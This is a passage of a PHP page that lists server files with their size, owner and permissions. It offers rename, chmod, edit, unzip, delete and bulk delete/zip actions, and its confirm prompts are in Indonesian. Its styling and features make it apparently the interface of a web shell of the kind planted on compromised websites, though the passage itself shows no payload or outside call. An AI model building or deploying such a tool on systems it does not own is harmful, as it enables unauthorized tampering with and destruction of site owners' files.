                <?= $isMesh ? '🛡' : '📄' ?> <a href="?d=<?= ep($dir) ?>&edit=<?= ep($full) ?>" style="color:<?= $isMesh ? '#0ff' : 'white' ?>"><?= htmlspecialchars($i) ?></a>
            <?php endif; ?>
        </td>
        <td align="right"><?= $size ?></td>
        <td align="center"><?= htmlspecialchars((string)$owner) ?></td>
        <td align="center"><span style="color:<?= $writable ? '#0f0' : '#f00' ?>"><?= $perm ?></span></td>
        <td align="center">
            <div style="display:flex; justify-content:center; gap:5px; flex-wrap:wrap;">
                <form method="post" style="display:inline-flex; gap:2px;">
                    <input type="hidden" name="old" value="<?= htmlspecialchars($i) ?>">
                    <input type="text" name="new" value="<?= htmlspecialchars($i) ?>" size="8" style="font-size:10px;">
                    <input type="submit" name="rename_submit" value="Rename" style="font-size:10px;">
                </form>
                <form method="post" style="display:inline-flex; gap:2px;">
                    <input type="hidden" name="target" value="<?= htmlspecialchars($i) ?>">
                    <input type="text" name="chmod_val" value="<?= $perm ?>" size="4" style="font-size:10px;">
                    <input type="submit" name="chmod_submit" value="Chmod" style="font-size:10px;">
                </form>
                <?php if (!$is_d): ?>
                    <a href="?d=<?= ep($dir) ?>&edit=<?= ep($full) ?>" style="color:lime;font-size:10px;">Edit</a>
                <?php endif; ?>
                <?php if (strtolower(pathinfo($i, PATHINFO_EXTENSION)) == 'zip'): ?>
                    <a href="?d=<?= ep($dir) ?>&unzip=<?= ep($i) ?>" style="color:orange;font-size:10px;">Unzip</a>
                <?php endif; ?>
                <a href="?d=<?= ep($dir) ?>&del=<?= ep($i) ?>" style="color:red;font-size:10px;" onclick="return confirm('Hapus?')">Del</a>
            </div>
        </td>
    </tr>
    <?php } ?>
</table>
<div style="margin-top:10px;">
    <input type="submit" name="bulk_del" value="Delete Selected" style="background:#900;color:white;padding:5px 15px;" onclick="return confirm('Yakin hapus?')">
    <input type="submit" name="zip_del" value="Zip Selected" style="background:#2980b9;color:white;padding:5px 15px;">
</div>
</form>

</body>
</html>
